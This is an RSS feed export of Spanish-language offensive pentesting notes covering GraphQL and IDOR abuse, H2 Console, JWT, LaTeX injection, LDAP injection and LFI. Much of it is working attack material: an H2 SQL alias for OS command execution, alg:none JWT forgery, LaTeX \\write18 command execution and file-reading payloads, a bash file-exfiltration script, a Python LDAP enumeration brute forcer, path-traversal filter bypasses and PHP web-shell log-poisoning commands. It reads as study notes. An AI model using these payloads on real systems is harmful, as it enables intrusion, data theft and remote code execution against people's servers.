Copy<br>Podríamos probar alterar, en este caso, el ID para intentar crear un nuevo post como otro usuario, de esta manera estaríamos abusando de mutations para realizar acciones que no deberían estar permitidas. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/graphql-introspection,-mutations-e-idors.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/GraphQL Introspection, Mutations e IDORs.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:44:36 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/graphql.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/graphql.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[H2 Console]]></title><description><![CDATA[ 
 <br><br>H2 Console es un sistema administrador de bases de datos relacionales porgramado en java. Puede ser incorporado en aplicaciones Java o ejecutarse de modo cliente-servidor. <br><br><br>Puede ser interesante tener en cuenta a la hora de iniciar sesión en este servicio cambiar el path (Ya que en caso de estar en uso, puede tirarnos error de inicio de sesión siendo falso.)<br><img alt="possible_login_fix_h2_consoe.png" src="https://dobliuw.com/lib/media/possible_login_fix_h2_consoe.png"><br>
Ahora si, para abusar de este servicio web, podríamos inyectar la siguiente query SQL: <br>CREATE ALIAS cmd AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
Copy<br>Una vez ejecutada la anterior sentencia, ahora podremos hacer uso de cmd como función para ejecutar comandos: <br>call cmd('{command_to_execute}'); 
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/h2-console.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/H2 Console.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:44:45 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/possible_login_fix_h2_consoe.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/possible_login_fix_h2_consoe.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[¿ Que son las <strong>IDORs</strong> ?]]></title><description><![CDATA[ 
 <br><br>Las Insecure Direct Object Reference (IDOR) son un tipo de vulnerabilidad de seguridad que se produce cuando una aplicación web utiliza identificadores internos (como números o nombres) para identificar y acceder a recursos (como archivos o datos) y no valida adecuadamente la autorización del usuario para acceder a ellos. <br>Por ejemplo, si una aplicación web utiliza un identificador numérico para identificar un registro en una base de datos, un atacante puede intentar adivinar este identificador y acceder a los registros sin la debida autorización. Esto puede permitir a los atacantes acceder a información confidencial, modificar datos, crear cuentas de usuario no autorizadas y realizar otras acciones maliciosas. <br>Esta vulnerabilidad se puede producir cuando una aplicación web no implemente controles de acceso adecuados para los recursos que maneja. Por ejemplo, una aplicación puede validar el acceso a través de autenticación y autorización para los recursos que se muestran en la interfaz de usuario, pero no aplicar la misma validación para los recursos que se acceden directamente a través de una URL. <br><br><br>Para prevenir la vulnerabilidad IDOR, es importante validad adecuadamente la autorización del usuario para acceder a los recursos, tanto en la interfaz de usuario como en las solicitudes directas a través de URL. Además, se recomienda restringir los permisos de acceso a los recursos y mantener actualizado el software y los sistemas operativos. <br><br><br>Para explotar una vulnerabilidad IDOR, un atacante puede intentar modificar manualmente el identificador de un objeto en la URL o utilizar una herramienta automatizada para probar diferentes valores. Si el atacante encuentra un identificador que le permite acceder a un recurso que no debería estar disponible, entonces la vulnerabilidad IDOR se ha explotado con éxito. <br>Por ejemplo, supongamos que un usuario 'A' tiene un pedido con el identificador numérico 123 y el usuario 'B' tiene un pedido con el identificador numérico 124. Si el atacante intenta acceder a través de la URL "<a data-tooltip-position="top" aria-label="http://example.com/orders/124%22" rel="noopener nofollow" class="external-link" href="http://example.com/orders/124%22" target="_blank">http://example.com/orders/124"</a>, la aplicación web podría permitir el acceso a este pedido sin validar si el usuario tiene permiso para acceder a él. De esta manera, el atacante podría acceder al pedido del usuario 'B' sin la debida autorización. <br>De manera que con el simple hecho de probar a cambiar dichos identificadores o incluso usando una de las <a data-href="Tools" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/tools.html" class="internal-link" target="_self" rel="noopener nofollow">Tools</a> como wfuzz o gobuster también podriamos probar llegar a datos sensibles. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/idors-(-insecure-direct-object-reference-).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/IDORs - ( Insecure Direct Object Reference ).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:44:54 GMT</pubDate></item><item><title><![CDATA[¿ Que son los <strong>Json Web Tokens (JWT)</strong> ?]]></title><description><![CDATA[ 
 <br><br>Los Jason Web Tokens (JWT) son un tipo de token utilizado en la autenticación y autorización de usuarios en aplicaciones web. JWT es un estándar abierto (RFC 7519) que define un formato compacto y seguro para transmitir información entre diferentes partes de forma confiable. <br><br><br>Para prevenir la enumeración y explotación de los JWT, es importante utilizar prácticas seguras de desarrollo web, como la validación adecuada de las solicitudes de entrada, la gestión segura de las claves de firma JWT y la limitación del tiempo de expiración de los JWT.<br><br><br>La enumeración de los JWT se produce cuando un atacante utiliza técnicas de fuerza bruta o cierta ingeniería inversa para obtener información sobre los JWT utilizados por la aplicación web. Por ejemplo, el atacante podría intentar adivinar los valores de los JWT mediante la construcción de tokens falsos, tratando de validar en todo momento si la aplicación web los acepta o no. Si el atacante tiene éxito en la enumeración de un JWT válido, podría obtener información confidencial, como nombres de usuario, contraseñas, roles de usuario y otros datos sensibles. <br><br><br>La explotación de los JWT se produce cuando un atacante utiliza la información obtenida de la enumeración del JWT para explotar debilidades en la aplicación. Por ejemplo, si la aplicación web utiliza JWT para la autenticación, pero no valida adecuadamente la firma del JWT, un atacante podría falsificar el token y acceder a la aplicación web como si fuera un usuario legítimo. <br>Ahora bien, es importante entender como se construye un JWT: <br><img alt="JWT_Strcture.png" src="https://dobliuw.com/lib/media/jwt_strcture.png"><br>Los JWT se separan por puntos, siendo la primera cadena y la segunda, correspondientes a, en primer lugar el hearder y en segundo lugar el payload. Estas dos cadenas suelen se un JSON convertido a Base64. Por ultimo tenemos la verify signature, es decir la firma de verificación digital, la cual se encarga de validar la integridad del token para evitar posibles modificaciones y se compone de un "secret", es decir, una clave secreta junto a un algoritmo de encriptación. <br>
<br>


<br>De cara a un ataque para robar la identidad de otro usuario o ataques de JWT, lo que se suele probar en primer lugar es una técnica para burlar dicha verify signature ( Esto funcionara en páginas las cuales estén mal desarrolladas y no se valide adecuadamente la firma ). <br>El ataque consiste en cambiar el método de encriptación a NONE, haciendo uso de la página <a data-tooltip-position="top" aria-label="https://jwt.io" rel="noopener nofollow" class="external-link" href="https://jwt.io" target="_blank">JWT.io</a> podemos ingresar tokens para ver como estos se conforman: <br><img alt="JWT.io.png" src="https://dobliuw.com/lib/media/jwt.io.png"><br>De esta manera podemos ver que la primera parte correspondiente al HEADER es un JSON en base64 con el siguiente formato: <br>{
	"alg": "HS256",
	"typ": "JWT"
}
Copy<br>Mientras que el PAYLOAD es un JSON en base64 con el siguiente formato: <br>{
	"id": 1,
	"iat": 1685376579,
	"exp": 1685350179
}
Copy<br>Y la VERIFY SIGNATURE es un HASH con el formato HS256 del conjunto de HEADER + . + PAYLOAD + ( CLAVE SECRETA | SECRET ). <br>Por lo que para, por ejemplo, suplantar la identidad del usuario 2, entendemos que en el PAYLOAD deberíamos remplazar el "id":1 por un "id":2, pero nuestro problema es que no conocemos el secret por si existiera una validación en el código de este mismo... Pero como mencionamos anteriormente, existen páginas que se encuentran mal desarrolladas y no validan dicha signature, por lo que en primer lugar lo que podríamos intentar realizar es burlar este haciendo uso de un tipo de cifrado NONE, por lo que deberiamos remplazar el HEADER por el siguiente JSON: <br>{
	"alg": "NONE",
	"typ": "JWT"
}
Copy<br>Luego, convertirlo a base64, y el resultado de este sería nuestro primer fragmento de el JWT: <br>echo -n '{"alg":"NONE","typ":"JWT"}' | base64 
Copy<br>Por ultimo, realizariamos el cambio necesario en el PAYLOAD, en este ejemplo al intentar remplazar la identidad del usuario 2 simplemente remplazariamos el id: <br>{
	"id": 2,
	"iat": 1685376579,
	"exp": 1685350179
}
Copy<br>Y una vez más, lo convertimos a base64: <br>echo -n '{"id":2,"iat":1685376579,"exp":1685350179}' | base64 
Copy<br>El conjunto de ambas cadenas en base64 separadas un por un punto, junto a un punto al final dejando vació la SIGNATURE, en caso de que la aplicación este mal desarrollada, daría como resultado un JWT válido. <br>echo -n '{"alg":"NONE","typ":"JWT"}' | base64 # eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0=
echo -n '{"id":2,"iat":1685376579,"exp":1685350179}' | base64 # eyJpZCI6MiwiaWF0IjoxNjg1Mzc2NTc5LCJleHAiOjE2ODUzNTAxNzl9
# JWT: 
# {resultado_base64_header}.{resultado_base64_payload}.
# eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJpZCI6MiwiaWF0IjoxNjg1Mzc2NTc5LCJleHAiOjE2ODUzNTAxNzl9. 
Copy<br>
<br>

Por otro lado, una manera de burlar las autenticaciones de JWT es teniendo el secret en donde podríamos generar JWT con privilegios elevados.
<br>pip3 install PyJWT
Copy<br>Una vez instalado el modulo PyJWT podríamos importar la libreria jwt para generar nuestros propios jwt con el secret que tengamos.<br>import jwt
jwt.encode({'username':'admin'},{secret},algorithm="HS256")
Copy<br>
<br>

Otro caso es cuando tenemos que la aplicación SI VALIDA el VERIFY SECRET de nuestro JWT, pero existe la posibilidad de que es secret sea común y este en diccionarios tipicos, por lo que podríamos probar en la página <a data-tooltip-position="top" aria-label="https://jwt.io" rel="noopener nofollow" class="external-link" href="https://jwt.io" target="_blank">JWT.io</a> de ingresar un secreto débil típico que se encuentre en un diccionario de fuerza bruta e ir probando. 
<br><br><br>Otra herramienta que podemos utilizar es la herramienta <a data-tooltip-position="top" aria-label="https://github.com/ticarpi/jwt_tool" rel="noopener nofollow" class="external-link" href="https://github.com/ticarpi/jwt_tool" target="_blank">jwt_tool</a> la cual nos permite realizar diversas tareas relacionadas con los JWT Tokens como decodificarlos, análisarlos, manipularlos, generarlos y realizar ataques de fuerza bruta y fuzzing.<br># Instalación 
sudo git clone https://github.com/ticarpi/jwt_tool

# Usage

# Decodificar JWT
python3 jwt_tool.py '{jwt}' 

# Ataques comunes (PlayBook)
python3 jwt_tool.py -t {url} -rh "{token_header} {toekn} ('Authorization: Barer {jwt}')" -M pb

# Realizar ataques 

# Algoritmo:none
python3 jwt_tool.py '{jwt}' -X a

# Brute Force
python3 jwt_tool.py '{jwt}' -C -d {secrets_list}

Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/jwt-(json-web-tokens)-enum-&amp;-explotation.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/JWT - (JSON Web Tokens) Enum &amp; explotation.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 21 Aug 2024 19:01:10 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/jwt_strcture.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/jwt_strcture.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[¿ Que es <strong>LaTeX</strong> ?]]></title><description><![CDATA[ 
 <br><br>LaTeX es un sistema de composición de textos, orientado a la creación de documentos escritos que presenten una alta calidad tipográfica. Esta formado mayoritariamente por órdenes construidas a partir de comandos de TeX pero con la ventaja de poder aumentar las capacidades de  LaTeX utilizando comandos propios de TeX .<br><br><br>Las inyecciones LaTeX son un tipo de ataque que se aprovecha de las vulnerabilidades en las aplicaciones web que permiten a los usuarios ingresar texto formateado en LaTeX. LaTeX es un sistema de composición de textos que se utiliza comúnmente en la escritura académica y científica.<br>Estos ataques ocurren cuando un atacante ingresa código LaTeX malicioso en un campo de entrada de texto que luego se procesa en una aplicación web. El código LaTeX puede ser diseñado para aprovechar vulnerabilidades en la aplicación conseguir una <a data-href="RCE - (Remote Command Execution)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener nofollow">RCE - (Remote Command Execution)</a>. <br>Un ejemplo podría ser un atacante qeu aprovecha la capacidad de LaTeX para incluir gráficos y archivos en una aplicación web. Un atacante podría enviar un código LaTeX que incluya un enlace a un archivo malicioso, como un virus o un troyano, que podría infectar el servidor o los sistemas de la red. <br><br><br>Para evitar las inyecciones LaTeX, las aplicaciones web deben validar y limpiar adecuadamente los datos que se reciben antes de procesarlos en LaTeX. Esto incluye la eliminación de caracteres especiales y la limitación de los comandos que pueden ser ejecutados en LaTeX.<br>También es importate que las aplicaciones web se ejecuten con privilegios mínimos en la red y que se monitorees regularmente las actividades de la aplicación para detectar posibles inyecciones. Además, se debe fomentar la educación sobre la seguridad en el use de LaTeX y cómo evitar la introducción de código malicioso.<br><br><br>En la explotación de LaTeX, existen varias inyecciónes las cuales se pueden ver (<a data-tooltip-position="top" aria-label="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection" rel="noopener nofollow" class="external-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection" target="_blank">Inyecciones de LaTeX</a>, <a data-tooltip-position="top" aria-label="https://salmonsec.com/cheatsheet/latex_injection" rel="noopener nofollow" class="external-link" href="https://salmonsec.com/cheatsheet/latex_injection" target="_blank">más inyecciones en otra página</a>). <br><br>\input{/etc/passwd} Esto aveces puede entrar en conflicto devido a los caracteres<br>Por lo que podriamos hacer uso de este input para leer archivos y haciendo uso \immediate\write18{command} para hacer algo como lo sig. <br>\immediate\write18{cat /etc/passwd | base64 &gt; output}<br>
`\input{output}<br> Otras inyecciones sirven para leer unicamente arcivos .tex:<br>\include{somefile} # load .tex file (somefile.tex)<br>Tambien podriamos leer línea por línea:<br>Para ver la primera línea de un archivo: <br>\newread\file<br>
\openin\file=/etc/passwd<br>
\read\file to\line<br>
\text{\line}<br>
\closein\file<br>Para ver la segunda: <br>\newread\file<br>
\openin\file=/etc/passwd<br>
\read\file to\line<br>
\read\file to\line<br>
\text{\line}<br>
\closein\file<br>Y así sucesivamente para ver más lineas agregando el \read\file to\line<br>Si bien podriamos intentar leer multiples líneas de LaTeX, hay veces que por determinados carácteres no se logran visualizar, por lo que podriamos tener un error, en ese caso seria más optimo crear un script en bash para lograr esto mismo. <br>Ejemplo de script:<br>#!/bin/bash 
 
# Global Vars 

declare -r url="http://localhost/ajax.php" # Declaramos una variable unicamente de "lecutar" para evitar ocupar mucho espacio
filename=$1

if [ $filename ]; then
	line="%0A\read\file%20to\line"
  for i in $(seq 1 100);do 

	file_to_download=$(curl -s -X POST $url -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -d "content=\newread\file%0A\openin\file=$filename$line%0A\text{\line}%0A\closein\file&amp;template=blank" | /usr/bin/grep -i download | /usr/bin/awk 'NF{print $NF}')
  
	if [ $file_to_download ]; then 
	  wget $file_to_download &amp;&gt;/dev/null 
  
	  file_to_convert=$(echo $file_to_download | /usr/bin/tr '/' ' ' | /usr/bin/awk 'NF{print $NF}')
	  /usr/bin/pdftotext $file_to_convert 
  
	  file_to_read=$(echo $file_to_convert | /usr/bin/sed 's/\.pdf/\.txt/')
	  rm $file_to_convert 
	  /usr/bin/cat $file_to_read | /usr/bin/head -n 1
	  rm $file_to_read
	  line+="%0A\read\file%20to\line"
	else 
	  line+="%0A\read\file%20to\line"
	fi
  done 
else 
  echo -e "\n\n\t[!] Usage: $0 /etc/passwd\n\n"
fi 
Copy<br>Tambíen podriamos intentar ejecutar comandos <br>\immediate\write18{whoami}<br>O ejecutar un comando y leer el output que es guardado en un archivo: <br>\immediate\write18{whoami &gt; output}<br>
\newread\file<br>
\openin\file=output \read\file to\line \read\file to\line \text{\line} \closein\file`<br>Y para burlar algunas reinstricciones se podria hacer uso de la definición de "variables": <br>\def\first{in} \def\second{put}`<br><br>\newread\file \openin\file=/etc/passwd \read\file to\line \text{\line} \closein\file $\lstinputlisting{/etc/passwd}$]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/latex-injections.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/LaTeX Injections.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:45:22 GMT</pubDate></item><item><title><![CDATA[¿ Que es <strong>LDAP</strong> ?]]></title><description><![CDATA[ 
 <br><br>LDAP (Protocolo Ligeor de Acceso a Directoriomuy utilizado en ￼￼Active Directory￼￼ que se usan para gestionar) pertenece a uno de los tantos <a data-href="Servicios y puertos comunes" href="https://dobliuw.com/Servicios y puertos comunes" class="internal-link" target="_self" rel="noopener nofollow">Servicios y puertos comunes</a> y se utiliza para acceder a la información que está almacenadad de forma centralizada en una red. <br><br><br>Las Inyecciones LDAP son un tipo de ataque en el que se aprovechan las vulnerabilidades en las apliacciones web que interactúan con un servidor LDAP. El servidor LDAP es un directorio que se utiliza para almacenar información de usuarios y recursos en una red. <br>Las inyecciones LDAP funcionan mediante la inserción de comandos LDAP maliciosos en los campos de entrada de una aplicación web, que luego son enviados al servido LDAP para su proesamiento. Si la apliacción web no está diseñada adecuadamente para manejar la entrada del usuario, un atacante puede aprovechar esta debilidad para realizar operaciones no autorizadas en el servidor LDAP<br>Asi como en las <a data-href="SQLI - (SQL Injections)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/sqli-(sql-injections).html" class="internal-link" target="_self" rel="noopener nofollow">SQLI - (SQL Injections)</a> y <a data-href="NoSQLI - (NoSQL Injections)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/nosqli-(nosql-injections).html" class="internal-link" target="_self" rel="noopener nofollow">NoSQLI - (NoSQL Injections)</a>, las inyecciones LDAP pueden ser muy peligrosas. Algunos ejemplos de lo que un atacante podría lograr mediante una inyección LDAP incluyen: <br>
<br>


<br>


<br>


<br><br><br>Esto puede explotarse cuando una web utiliza busquedas de LDAP, por lo que primeramente podriamos entender como seria una busqueda de ldap.<br>Obviamente lo primero seria conseguir los datos necesarios como el nombre del domio y demás y esto podria hacerse con <a data-href="Nmap" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/nmap.html" class="internal-link" target="_self" rel="noopener nofollow">Nmap</a>. <br>locate .nse | grep ldap 
# Para ver todos los scripts programados en lua que tiene nmap acerca de ldap. 
nmap --script ldap\* -p 389 {ip}
Copy<br>Y una vez que entendamos como y de donde conseguir dichos datos, ahora si podemos ver un ejemplo de busqueda de datos con ldap <br>ldapsearch -x -H ldap://{ip} -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin 'cn=admin'
Copy<br>Comenzemos a partir por partes el comando. <br>
<br>


<br>


<br>


<br>


<br>


<br>


<br>Estos parametros de busqueda pueden ser más avanzados, jugando con AND y OR. <br>
<br>


<br>


<br><br><br>
<br>


<br>username=admin&amp;password=* Al usar asterisco en LDAP, lo que estamos haciendo es matchear con el valor que haya, por lo que si la web nos permitiece poner un asterisco la busqueda sería <br>ldapsearch -x -H ldap://{ip} -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin '(&amp;(cn=admin)(userPassword=*))'
Copy<br>
<br>


<br>Tengamos en cuenta que los campos que se completan son inyectados en los parametros de busqueda de ldapsearch, por lo que podriamos intentar modificar la query original de busqueda<br>ldapsearch -x -H ldap://{ip} -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin '(&amp;(cn=%s)(userPassword=%s))'
Copy<br>Que pasaria si donde ingresarmos el username=%s en la web, que hace referencia al apartado de (&amp;(cn=%s))en ldapsearch, ingresamos el valor admin))%00? Lo que pasaria es que estariamos cerrando manualmente la query original a la par que ingresando un null byte (%00) para evitar que se lea la segunda condición de (userPassword=%s)). <br># De alguna manera la query quedaria de la sig manera: 
ldapsearch -x -H ldap://{ip} -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin '(&amp;(cn=admin))%00'#)(userPassword=*))'
Copy<br>
<br>


<br>Una vez que sabemos que los campos son vulnerables a estas inyecciones, se nos podria ocurrir realizar scripts en python para enumerar usuarios, jugar con una de las <a data-href="Tools" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/tools.html" class="internal-link" target="_self" rel="noopener nofollow">Tools</a> com wfuzz o gobuster para aplicar numeración de los atributos, entre otras cosas.<br>wfuzz -c -t 200 --hs=200 -w /usr/share/SecLists/Fuzzing/LDAP-openldap-attributes.txt -d "user_id=admin)(FUZZ=*))%00&amp;password=*&amp;login=1&amp;submit=Submit" "http://localhost:8888"
Copy<br>Por lo que la query maliciosa sería la sig. admin)(FUZZ=*))%00. <br>Tambien podriamos crear usuarios (En este caso, debido que tenemos las credenciales del usuario admin de LDAP y estamos en un escenario de ejemplo), con el comando ldapadd -x -H ldap://{ip} -D "cn=admin,dc=example,dc=org" -w {password} -f {file_ldif}. <br>Un archivo ldif tiene la definición de (en este caso) la estructura de un usuario, lo cual podria ser algo similar a lo sig.: <br>dn: uid=dobliuw,dc=example,dc=org
uid: dobliuw
cn: dobliuw
sn: 3
objectClass: top
objectClass: posixAccount
objectClass: inetOrgPerson
loginShell: /bin/bash
homeDirectory: /home/dobliuw
uidNumber: 14583102
gidNumber: 14564100
userPassword: dobliuw123
mail: dobliuw@example.org
description: El mejor hacker del mundo papaaaaa
telephoneNumber: +54 52345245
Copy<br>Y de esta manera podemos crear un simple script en python para enumerar usuarios: <br>#!/usr/bin/python3
from pwn import * 
import sys, requests, time, string, signal 

# Ctrl + C 

def ctrl_c(signal, frame):
    print("\n\n\t[!] Quiting...\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

# Global vars

url = "http://localhost:8888"
characters = string.ascii_lowercase
headers = {"Content-Type":"application/x-www-form-urlencoded"}
#burp_proxy = {'http': 'http://127.0.0.1/8080'}

# Bin 

p1 = log.progress("Brute Force")
p2 = log.progress("Users")

def getInitialUsers(): 
    
    users = []

    p1.status("Initializing brute force process")
    time.sleep(5)

    for character in characters: 
        payload = "user_id={}*))%00&amp;password=*&amp;login=1&amp;submit=Submit".format(character)
        p1.status("Sending payload: {}".format(payload))
        r = requests.post(url, headers=headers, data=payload, allow_redirects=False) #proxies=burp_proxy
        if r.status_code == 301: 
            users.append(character)

    return users


def getUser(letter): 

    user = letter 

    for i in range(1,10):
        for character in characters:
            payload = "user_id={}{}*))%00&amp;password=*&amp;login=1&amp;submit=Submit".format(user,character)
            p1.status("Sending payload: {}".format(payload))
            p2.status(user)
            r = requests.post(url, headers=headers, data=payload, allow_redirects=False)
            if r.status_code == 301: 
                user+=character

    return user 


if __name__ == "__main__": 
    initialUsers = getInitialUsers()
    users = []
    for initial in initialUsers:
        users.append(getUser(initial))
        
    print("""\n\n============== Users finded =================  
(!) {}\n\n""".format(users))
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/ldap-injections.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/LDAP Injections.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:45:27 GMT</pubDate></item><item><title><![CDATA[¿ Que es un <strong>LFI</strong> ?]]></title><description><![CDATA[ 
 <br><br>El LFI es una vulnerabilidad de seguridad informática que se produce cuando una aplicación web no valida adecauadamente las entradas del usuario, permitiendo a un atacante acceder a archvios locales en el servidor web.<br>Muchas veces, los atacantes aprovechas el FLI al abusar de parámetros de entrada en la aplicación web. Los parámetros de entrada son datos que los usuarios ingresan en la aplicación web, como las URL o los campos de formulario. Los atacantes pueden manipular los parámetros de entrada para incluir rutas de archivo local en la solicitud, lo que puede permitires acceder a archivos en el servidor web. Esta técnica se conoce como "Path Traversal" y se utiliza comúnmente en ataques de LFI.<br><br><br>Para enumerar los posibles LFI y su respectiva explotación lo vamos a hacer de manera local junto a un archivo php para levantar nuestro servicio de apache, de esta manera, podemos ver como un desarrollador podria encarar el intento de LFI asi como burlarlo. <br><br>	$filename = $_GET['file'];
	include($filename); 
Copy<br>Esto seria la LFI más basica, ya que directamente es confia en el input del usuario, donde se lee una query de la url con nombre file para incluirla a invel de sistema. Con poner en la url ....?file=/etc/passwd estariamos leyendo archivos locales del sistema.<br><br>	$filename = $_GET['file'];
	include("/var/www/html" . $filename);
Copy<br>Este "intento" de sanitización intenta obligar al usuario a introducir un arhivo de manera que se lo concatena con la ruta /var/www/html intentando obligar asi a que el archivo se encuentre en esta ruta, pero burlarlo, una vez más es posible, ya que jugando con Path Traversal se puede realizar ingresando en la url  ...?file=../../../../../../../etc/passwd estariamos volviendo a leer archivos locales del sistema.<br><br>	$filename = $_GET['file'];
	$filename = str_replace("../", "", $filename);
	include($filename); 
Copy<br>En este nuevo intento, el desarrollador podria estar intentando evitar un Path Traversal de manera que intenta remplazar los valores ../ por '' , es decir que esta eliminando de nuestro input los ../, pero, una vez más esto sigue siendo vulnerable, ya que este remplazo no es de manera recursiva, por lo que si ahora ingresamos en la url el valor de ...?file=....//....//....//....//....//....//....//....//....//....//etc/passwd estariamos una vez más volviendo a leer archivos locales del sistema.<br><br>	$filename = $_GET['file'];
	$filename = str_replace("../", "", $filename);
	if ( preg_match("/\/etc\/passwd/", $filename) === 1){
    echo "\n[!] No es posible visualizar el contenido de este archivo.\n"; 
	}else{  
    include("/var/www/html/" . $filename);
	}
	```

En este caso, no solo esta intentando evitar un **Path Traversal** como anteriormente si no que tambien esta jugando con regex para evitar la string `/etc/passwd`, pero esto sigue siendo vulnerable, no solo por el hecho de que jugando con `....//` se puede listar cualquier archivo, si no que tambien, podriamos listar el etc/passwd ya que la regex filtra por exctamente /etc/passwd por lo que podriamos ingrear `/etc/////./././///////passwd` y seguiriamos pudiendo listar este y cualquier archivo local del sistema.  (Se pueden ingresar cuantas barras '/' y puntos '.' querramos.)

Tambien a nivel de sistema, cuando usamos el `?` se pueden buscar archivos, por ejemplo `cat /e?c/pa??wd`. 

#### Forzando extensiones de archvios
```php
$filename = $_GET['file'];
	$filename = str_replace("../", "", $filename);
	include("/var/www/html/" . $filename . ".php"); 
Copy<br>En este caso el desarrollador estaria intentando forzarnos a que lo que ingresemos tenga la extención .php, por lo que si quisieramos ingresar /etc/passwd estariamos ingresando /etc/passwd.php (En caso de sortear todo tipo de validación posible). En este caso, lo que podriamos hacer es hacer uso de un NULL Byte, es importante aclarar que esto funciona para versiones antiguas de php y no actuales. Solo haria falta poner en la url<br>
...?file=....//....//....//....//....//....//....//....//....//etc/passwd%00, el %00 es un null Byte, lo cual anula lo posterior al mismo, anulando asi la extención '.php'. <br>Tambien si se hiciera una validación tal que  if(substr($argv[1],-6,6)!="passwd") include($argv[1]); asi, en donde se evalua que los ultimos 6 caracteres no sean "passwd", para versiones antiguas de php, podriamos utilizar el /. para burlar esto, de manera que si ingresamos /etc/passwd/. estariamos burlando la validación. Lo mismo que si se utilizara lo mismo para validar extenciones, por ejemploif(substr($argv[1],-4,4)!=".txt") include($argv[1]);, de esta manera no podriamos ver  archivos .txt, pero si hicieramos file.txt/. una vez más, estariamos burlando esto. <br><br><br>El Log Poisoning es una técnica de ataque en la que un atacante manipula los archivos de registro (logs) de una aplicación web para lograr un resultado malintencionado. Esta técnica puede ser utilizada en conjunto con una vulnerabilidad LFI para lograr un <a data-href="RCE - (Remote Command Execution)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener nofollow">RCE - (Remote Command Execution)</a>.  <br>Esto se puede dar abusando de los archivos de logs de ssh, Mail, Apache, etc.<br>
<br>

Podriamos desde un LFI ver la ruta /var/log/auth.log o /var/log/btmp, entre otras, para ver los logs de SSH, y de esta manera, en caso de que los podamos ver, envenenar el log (Log Poisoning) intentando conectarnos a ssh por ejemplo con el comando ssh '&lt;?php system($_GET["cmd"]); ?&gt;'@192.168.1.38. 

<br>

Podriamos desde un LFI ver la ruta /var/log/apache2/access.log, entre otras, para ver los logs de Apache, y de esta manera, en caso de que los podamos ver, envenenear el log (Log Poisoning) intentando hacer un curl a la ruta y inyectando el comando php en el User-Agent con el comando curl -s -X GET 'http://192.168.1.38' -d 'User-Agent: &lt;?php system($_GET["cmd"]); ?&gt;' o con  curl -s -X GET 'http://192.168.1.38' -A '&lt;?php system("whoami"); ?&gt;'.

